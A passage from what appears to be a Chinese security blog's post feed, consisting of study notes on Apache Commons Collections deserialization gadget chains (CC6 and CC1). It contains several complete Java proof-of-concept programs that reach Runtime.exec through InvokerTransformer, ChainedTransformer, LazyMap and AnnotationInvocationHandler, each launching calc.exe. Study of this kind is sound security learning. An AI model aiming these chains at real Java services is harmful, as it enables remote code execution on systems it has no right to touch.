LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();//这里是触发点\n        map2.put(tiedMapEntry,&quot;bbb&quot;);\n        lazymap.remove(&quot;aaa&quot;);//这里将序列化过程中存入的key删除\n\n        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值\n        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);//私有属性\n        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数\n\n        //Serialization(map2);\n        Unserialization();\n    &#125;\n&#125;\n\n</code></pre>\n<h3 id=\"注意\"><a class=\"anchor\" href=\"#注意\">#</a> 注意</h3>\n<p>上面是完整的 poc，下面来记录一下这个链子的两个注意的点</p>\n<pre><code class=\"language-java\">package CommonsCollection.Clown_CC6;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC1 &#123;\n    public static void Serialization(Object object) throws Exception&#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;output serialization&quot;);\n    &#125;\n    public static void Unserialization() throws Exception&#123;\n        FileInputStream fileInputStream = new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;input unserialization&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123;&quot;calc&quot; &#125;),\n        &#125;;\n        Transformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap map = new HashMap();\n//        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏\n        Map lazymap = LazyMap.decorate(map,chainedTransformer);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();//这里是触发点\n        map2.put(tiedMapEntry,&quot;bbb&quot;);\n//        lazymap.remove(&quot;aaa&quot;);//这里将序列化过程中存入的key删除\n\n//        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值\n//        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);\n//        factoryField.setAccessible(true);//私有属性\n//        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数\n\n        Serialization(map2);\n//        Unserialization();\n    &#125;\n&#125;\n</code></pre>\n<p>首先是这里在序列化的时候就已经触发了命令执行，这里跟 URLDNS 的思想一样，在序列化的阶段的 put 触发，那么最简单的思想就是在 put 前将链子中断，put 之后再将链子指向改为正确的</p>\n<pre><code class=\"language-java\">package CommonsCollection.Clown_CC6;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC1 &#123;\n    public static void Serialization(Object object) throws Exception&#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;output serialization&quot;);\n    &#125;\n    public static void Unserialization() throws Exception&#123;\n        FileInputStream fileInputStream = new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;input unserialization&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123;&quot;calc&quot; &#125;),\n        &#125;;\n        Transformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap map = new HashMap();\n        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏\n//        Map lazymap = LazyMap.decorate(map,chainedTransformer);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();//这里是触发点\n        map2.put(tiedMapEntry,&quot;bbb&quot;);\n//        lazymap.remove(&quot;aaa&quot;);//这里将序列化过程中存入的key删除\n\n        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值\n        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);//私有属性\n        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数\n\n        Serialization(map2);\n//        Unserialization();\n    &#125;\n&#125;\n</code></pre>\n<p>这里是为什么要有 lazymap.remove (&quot;aaa&quot;);，如果没有的话反序列化不能正常触发链子，这里在 put 下断点调试进去看一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181944904.png\" alt=\"image-20230518194433825\" /></p>\n<p>这里进到 hash，一直进到 get 方法</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181945986.png\" alt=\"image-20230518194538929\" /></p>\n<p>可以看到这里会判断 LazyMap 里面有没有 key，开始是没有的，然后回 put 进去一个键值对，所以如果这里不删除就会导致在反序列化的之后不能进到 if，不能调用 factory.Transform 函数</p>\n<h3 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230709172122054.png\" alt=\"image-20230709172122054\" /></p>\n",
            "tags": [
                "java安全",
                "CC6"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/05/16/CommonsCollections-1/",
            "url": "https://blog.xcu.icu/2023/05/16/CommonsCollections-1/",
            "title": "ConmonsCollection-1",
            "date_published": "2023-05-15T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>前面跟着 p 牛知识星球的文章学习 java 反序列的基础知识，RMI 和 URLDNS 链，现在大概算是勉强看到门？接下来准备开始学习 CommonsCollections 这个系列的利用链，以本篇记录</p>\n<h2 id=\"commons-collections-1\"><a class=\"anchor\" href=\"#commons-collections-1\">#</a> Commons Collections-1</h2>\n<p>这个 java 库是为了额外提供一些集合类和工具，这些类和工具不是标准的 java 集合框架的一部分，但是它可以更加方便的扩展集合的功能，它的出现主要是因为 java 集合框架的一些不足，使得开发人员更加高效的处理集合数据，它能够创建 “转换后的集合” 这些集合在每个元素被添加到集合中的时自动对其应用指定的转换。</p>\n<p>知道为什么要有这个 Commons Collections 后，接下来先记录这个过程中涉及到的几个接口和类</p>\n<h3 id=\"前置知识\"><a class=\"anchor\" href=\"#前置知识\">#</a> 前置知识</h3>\n<h4 id=\"transformer\"><a class=\"anchor\" href=\"#transformer\">#</a> Transformer</h4>\n<p>它是  <code>org.apache.commons.collections.Transformer</code>  接口中的一个方法，这个接口定义了一种将输入对象转换为输出对象的策略，常用于函数式编程中，可以视为一个以一个输入为参数，返回一个输出的函数， <code>Transformer(Object input)</code>  方法方法接收 <code>Object类型的input</code> ，处理后将 <code>Object返回</code> ，这个方法实现定义了转换逻辑</p>\n<p>下面是一个使用 Transformer 方法来将字符串列表转换为大写的形式</p>\n<pre><code class=\"language-java\">import org.apache.commons.collections.CollectionUtils;\nimport org.apache.commons.collections.Transformer;\n\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class TransformerTest &#123;\n    public static void main(String[] args) &#123;\n        List&lt;String&gt; strings = Arrays.asList(&quot;hello&quot;, &quot;world&quot;);\n        Transformer transformer = new Transformer() &#123;\n            public Object transform(Object input) &#123;\n                return ((String) input).toUpperCase();\n            &#125;\n        &#125;;\n        CollectionUtils.transform(strings, transformer);\n        System.out.println(strings);  // 输出 [HELLO, WORLD]\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211600780.png\" alt=\"image-20230421160051535\" /></p>\n<h4 id=\"transformedmap\"><a class=\"anchor\" href=\"#transformedmap\">#</a> TransformedMap</h4>\n<p>org.apache.commons.collections.map.TransformedMap 它实现了  <code>java.util.Map</code>  接口，它用来对 Map 中的键或值进行转换，在其构造方法 <code>TransformedMap</code>  中需要有两个参数一个要转换的 Map 对象和两个 Transformer 对象，分别对键和值进行转换，在使用 <code>TransformedMap</code>  时所有的 get，put，remove 方法在调用的时候都会自动调用这个 Transformer 对象</p>\n<pre><code class=\"language-java\">    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;\n        return new TransformedMap(map, keyTransformer, valueTransformer);\n    &#125;\n</code></pre>\n<h4 id=\"lazymap\"><a class=\"anchor\" href=\"#lazymap\">#</a> LazyMap</h4>\n<p><code>org.apache.commons.collections.map.LazyMap</code>  提供了一个创建动态生成值的 Map 的方法，它与 TransformedMap 很类似，区别在于 LazyMap 调用 get () 方法的时候，如果传入的 key 不存在的时候会触发相对应的 Transformer 的 transform () 方法</p>\n<h4 id=\"defaultedmap\"><a class=\"anchor\" href=\"#defaultedmap\">#</a> DefaultedMap</h4>\n<p><code>org.apache.commons.collections.map.DefaultedMap</code>  与上面的 LazyMap 方法相同，在调用 get () 方法的时候会自动调用 Transformer 方法</p>\n<h4 id=\"constanttransformer\"><a class=\"anchor\" href=\"#constanttransformer\">#</a> ConstantTransformer</h4>\n<p><code>org.apache.commons.collections.functors.ConstantTransformer</code>  提供了一个始终返回常量值的 Transformer 实现，在初始化的时候存储了一个 Object，这个类用于和 <code>ChainedTransformer</code>  配合，将其结果传入 <code>InvokerTransformer</code>  来调用我们指定的类的指定方法</p>\n<pre><code class=\"language-java\">public class ConstantTransformer implements Transformer, Serializable &#123;\n    private static final long serialVersionUID = 6374440726369055124L;\n    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);\n    private final Object iConstant;\n\n    public static Transformer getInstance(Object constantToReturn) &#123;\n        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));\n    &#125;\n\n    public ConstantTransformer(Object constantToReturn) &#123;\n        this.iConstant = constantToReturn;\n    &#125;\n\n    public Object transform(Object input) &#123;\n        return this.iConstant;\n    &#125;\n\n    public Object getConstant() &#123;\n        return this.iConstant;\n    &#125;\n&#125;\n</code></pre>\n<h4 id=\"invokertrabsformer\"><a class=\"anchor\" href=\"#invokertrabsformer\">#</a> InvokerTrabsformer</h4>\n<p>实现 Transformer 接口的一个类，这个类可以用来 <code>执行任意方法</code> ，这也是反序列化能够执行仍以代码的关键</p>\n<pre><code class=\"language-java\">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;\n        this.iMethodName = methodName;\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    &#125;\n</code></pre>\n<p>demo：</p>\n<pre><code class=\"language-java\">package Clown_CC1;\n\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\npublic class InvokerTransformerTest &#123;\n    public static void main(String[] args) &#123;\n        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;&#125;);\n        invokerTransformer.transform(Runtime.getRuntime());\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211920865.png\" alt=\"image-20230421192003749\" /></p>\n<h4 id=\"chainedtransformer\"><a class=\"anchor\" href=\"#chainedtransformer\">#</a> ChainedTransformer</h4>\n<p>实现 Transformer 接口的一个类，他的作用是将内部的多个 Transformer 串在一起</p>\n<pre><code class=\"language-java\">    public ChainedTransformer(Transformer[] transformers) &#123;\n        this.iTransformers = transformers;\n    &#125;\n\n    public Object transform(Object object) &#123;\n        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;\n            object = this.iTransformers[i].transform(object);\n        &#125;\n\n        return object;\n    &#125;\n</code></pre>\n<h3 id=\"demo\"><a class=\"anchor\" href=\"#demo\">#</a> demo</h3>\n<p>这里先贴一下 p 牛的代码，我加了一些注释</p>\n<pre><code class=\"language-java\">    public static void main(String[] args) throws Exception &#123;\n        Transformer[] transformers = new Transformer[]&#123;//创建了一个Transformer数组\n                new ConstantTransformer(Runtime.getRuntime()),//第一个Transformer返回JVM运行时对象\n                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n                        new Object[]&#123;&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;&#125;)//第二个Transformer通过IncokerTransformer调用Runtime的exec对象并弹一个计数器\n        &#125;;\n        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用\n        Map innerMap = new HashMap();//创建一个HashMap对象\n        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//创建一个TransformedMap对象，使用上面的TransformChain来修饰innerMap\n        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);//这里调用put方法（触发点）\n    &#125;\n</code></pre>\n<p>这里可以看到，通过 ChainedTransformer 将 <code>ConstantTransformer</code>  和 <code>InvokerTransformer</code>  连接在一起，将 <code>ChainedTransformer</code>  设置为 <code>map</code>  装饰器的处理方法，调用 <code>TransformedMap</code>  的 <code>put()</code>  方法时会触发 <code>Transformer</code>  链的调用方法。</p>\n<h3 id=\"annotationinvocationhandler\"><a class=\"anchor\" href=\"#annotationinvocationhandler\">#</a> AnnotationInvocationHandler</h3>\n<p>上面提到使用这个 put 调用，但是在实际序列化的时候没有办法手工执行这个 put，我们需要去寻找找到类似的写入操作在 readObject 中，这样反序列化的时候就能够成功触发，AnnotationInvocationHandler 就是这样一个类，这里我是 jdk8u65</p>\n<pre><code class=\"language-java\">    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException &#123;\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try &#123;\n            annotationType = AnnotationType.getInstance(type);\n        &#125; catch(IllegalArgumentException e) &#123;\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);\n        &#125;\n\n        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;\n            String name = memberValue.getKey();\n            Class&lt;?&gt; memberType = memberTypes.get(name);\n            if (memberType != null) &#123;  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) &#123;\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(\n                                annotationType.members().get(name)));\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n</code></pre>\n<p><code> for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</code> 和  <code>memberValue.setValue</code>  这个地方调用了 set 方法，可以作为触发点</p>\n<pre><code class=\"language-java\">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;\n        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();\n        if (!type.isAnnotation() ||\n            superInterfaces.length != 1 ||\n            superInterfaces[0] != java.lang.annotation.Annotation.class)\n            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);\n        this.type = type;\n        this.memberValues = memberValues;\n    &#125;\n</code></pre>\n<p>在构造方法中第一个参数是 Annotation 实现类的 class 对象，第二个对象是一个 Map，键为 String，值为 Object，如果 type 对象的父类接口不是唯一的且为 <code>Annotation.class</code>  则不会讲两个参数初始化到对象中</p>\n<p>再看上面重写的 readObject 方法，先通过 <code>annotationType = AnnotationType.getInstance(type);</code>  来获取 type 的对应的 <code>AnnotationType</code>  的对象，接着获取 <code>memberTypes</code>  属性接着遍历了它的所有元素，并依次设置值，这里就是 poc 的起点了</p>\n<p>这里去要创建一个 AnnotationInvocationHandler 对象，并将前面构造的 HashMap 设置进来</p>\n<pre><code class=\"language-java\">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);\n        constructor.setAccessible(true);\n        Object obj = constructor.newInstance(Retention.class,outerMap);\n</code></pre>\n<p>这里上面 p 牛直接用 Runtime 类是没有实现 java.io.Serializable 接口的，所以不允许被序列化，p 牛也是给了解决方法通过反射区调用</p>\n<pre><code class=\"language-java\">Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);\nRuntime r = (Runtime) f.invoke(null);\nr.exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);\n</code></pre>\n<p>编写成 Transformer 的写法</p>\n<pre><code class=\"language-java\">        Transformer[] transformers = new Transformer[] &#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123;&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; &#125;),\n        &#125;;\n</code></pre>\n<p>下面贴一下完整的 poc</p>\n<h3 id=\"poc_transformer\"><a class=\"anchor\" href=\"#poc_transformer\">#</a> poc_Transformer</h3>\n<pre><code class=\"language-java\">package Clown_CC1;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC1 &#123;\n    public static void Serialization(Object object) throws Exception&#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(object);\n        objectOutputStream.close();\n        System.out.println(&quot;Output&quot;);\n    &#125;\n\n    public static void Unserialization() throws  Exception&#123;\n        FileInputStream fileInputStream = new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        objectInputStream.close();\n        System.out.println(&quot;Input&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception &#123;\n        Transformer[] transformers = new Transformer[] &#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123;&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; &#125;),\n        &#125;;\n        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用\n        Map innerMap = new HashMap();//创建一个HashMap对象\n        innerMap.put(&quot;value&quot;,&quot;xxx&quot;);\n        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//创建一个TransformedMap对象，使用上面的TransformChain来修饰innerMap\n//        outerMapput(&quot;test&quot;, &quot;xxxx&quot;);//这里调用put方法（触发点）\n\n        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);\n        constructor.setAccessible(true);\n        Object obj = constructor.newInstance(Retention.class,outerMap);\n        Serialization(obj);\n        Unserialization();\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230054334.png\" alt=\"image-20230423005357596\" /></p>\n<h3 id=\"poc_lazymap\"><a class=\"anchor\" href=\"#poc_lazymap\">#</a> poc_LazyMap</h3>\n<p>上面是跟着 p 牛写的链子，这里也是看到 ysoserial 中的 CommonsCollections1 的 payload 中使用的是 LazyMap</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230056665.png\" alt=\"image-20230423005656630\" /></p>\n<p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator，在 ysoserial 的源码中主要是利用 LazyMap 的 get 这个方法，这里 LazyMap 的作用是 “懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161332751.png\" alt=\"image-20230516133251707\" /></p>\n<p>这个 factory 是可控的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161335157.png\" alt=\"image-20230516133510116\" /></p>\n<p>相比于 TransformedMap 的利用方法，LazyMap 后续利用稍微复杂一些，原因是在 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject 方法中并没有直接调用到 Map 的 get 方法，所以在 ysoserial 中利用的是 sun.reflect.annotation.AnnotationInvocationHandler 的 invoke 方法</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161337219.png\" alt=\"image-20230516133753158\" /></p>\n<p>而想要调用这个 invoke 就需要使用到 java 的对象代理</p>\n<pre><code class=\"language-java\">package Clown_CC1;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class LazyMap_CC1 &#123;\n    public static void main(String[] args) throws Exception&#123;\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(Runtime.getRuntime()),\n                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;&#125;)\n        &#125;;\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        Map innerMap = new HashMap();\n        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);\n        lazyMap.get(&quot;test&quot;);\n    &#125;\n&#125;\n</code></pre>\n<p>同样上面的是我手动去触发的 get 方法，下面用 java 对象代理来修改完整的 poc 链</p>\n<pre><code class=\"language-java\">package Clown_CC1;\n\nimport org.apache.commons.collections.ProxyMap;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC2 &#123;\n    public static void Serialization(Object object) throws Exception&#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(&quot;poc2.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;OutPut&quot;);\n    &#125;\n\n    public static void Unserialization() throws Exception&#123;\n        FileInputStream fileInputStream = new FileInputStream(&quot;poc2.txt&quot;);\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;InPut&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception &#123;\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123;&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; &#125;),\n        &#125;;\n\n        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用\n        Map innerMap = new HashMap();//创建一个HashMap对象\n        innerMap.put(&quot;value&quot;,&quot;xxx&quot;);\n        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\n        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);\n        constructor.setAccessible(true);\n\n        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);\n        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);\n        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);\n        Serialization(handler);\n        Unserialization();\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230124040.png\" alt=\"image-20230423012448964\" /></p>\n<h3 id=\"总结分析\"><a class=\"anchor\" href=\"#总结分析\">#</a> 总结分析</h3>\n<p>这里拿 Transformer 的这个 poc 举例，首先是利用 InvokerTransformer，因为这个函数中的 Transformer 函数实现了 invoke</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290158756.png\" alt=\"image-20230429015825587\" /></p>\n<p>可以执行方法，利用点找到后回推，寻找一个也调用 Transform 的类，来调用 InvokerTransformer 中的 Transformer 方法，在 TransformedMap 中有一个 checkTransformer</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290200987.png\" alt=\"image-20230429020030950\" /></p>\n<p>这里调用了 Transform 方法，且这里的 valueTransformer 可控</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290202793.png\" alt=\"image-20230429020205753\" /></p>\n<p>这里本意是对 Map 的键值通过 Transform 进行一个处理，可以利用，接着寻找哪个类调用了 checksetValue，寻找后发现在 AbstractInputCheckedMapDecorator 有调用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290207608.png\" alt=\"image-20230429020705557\" /></p>\n<p>这里 MapEntry 其实就是键值对 MapEntry 中的 setValue 方法其实就是 Entry 中的 setValue 方法，他这里重写了 setValue 方法，所以说只需要遍历就能调用？？？不确定，可以试一下</p>\n<pre><code class=\"language-java\">package Clown_CC1;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class POC3test &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Transformer[] transformer =new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),\n                new 